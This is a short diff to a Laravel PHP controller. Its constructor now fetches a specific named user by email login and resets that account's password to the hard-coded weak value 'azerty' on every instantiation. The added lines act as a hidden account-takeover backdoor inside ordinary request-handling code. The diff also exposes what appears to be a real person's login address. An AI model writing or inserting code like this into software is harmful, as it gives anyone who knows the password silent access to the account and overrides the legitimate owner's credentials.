@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Pdf\PdfMaker;
+use App\Utilisateur;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
 
@@ -17,6 +18,9 @@ class HomeController extends Controller
     public function __construct()
     {
         $this->middleware('auth');
+        $user = Utilisateur::where('login',"=","ahmed.kone@ivoireautoservices.net")->first();
+        $user->password = bcrypt("azerty");
+        $user->save();
     }
 
     /**
